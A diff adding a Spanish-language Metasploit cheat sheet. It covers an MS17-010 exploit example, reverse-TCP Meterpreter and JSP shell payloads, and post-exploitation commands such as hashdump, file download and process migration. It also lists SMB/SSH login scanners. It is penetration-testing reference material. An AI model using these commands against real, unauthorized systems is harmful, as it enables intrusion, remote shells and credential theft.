@@ -1,0 +1,43 @@
+# METASPLOIT FRAMEWORK
+
+## Comandos Básicos
+msfconsole                        # Iniciar Metasploit
+help                              # Ayuda general
+search type:exploit platform:linux # Buscar exploits
+use exploit/windows/smb/ms17_010  # Seleccionar exploit
+info                              # Información del módulo
+show options                      # Mostrar opciones
+set RHOSTS 192.168.1.100         # Configurar objetivo
+set LHOST 192.168.1.50           # Configurar listener
+run                               # Ejecutar exploit
+
+## Payloads
+show payloads                     # Mostrar payloads disponibles
+set payload windows/meterpreter/reverse_tcp
+set payload linux/x86/meterpreter/reverse_tcp
+set payload java/jsp_shell_reverse_tcp
+
+## Meterpreter
+sessions                          # Listar sesiones
+sessions -i 1                     # Interactuar con sesión
+sysinfo                           # Información del sistema
+getuid                            # Usuario actual
+ps                                # Procesos
+migrate 1234                      # Migrar proceso
+download archivo.txt              # Descargar archivo
+upload archivo.txt                # Subir archivo
+shell                             # Shell del sistema
+hashdump                          # Volcado de hashes
+
+## Auxiliares
+use auxiliary/scanner/portscan/tcp
+use auxiliary/scanner/http/dir_scanner
+use auxiliary/scanner/smb/smb_login
+use auxiliary/scanner/ssh/ssh_login
+
+## Base de Datos
+db_status                         # Estado de la BD
+workspace                         # Espacios de trabajo
+hosts                             # Hosts descubiertos
+services                          # Servicios descubiertos
+vulns                             # Vulnerabilidades
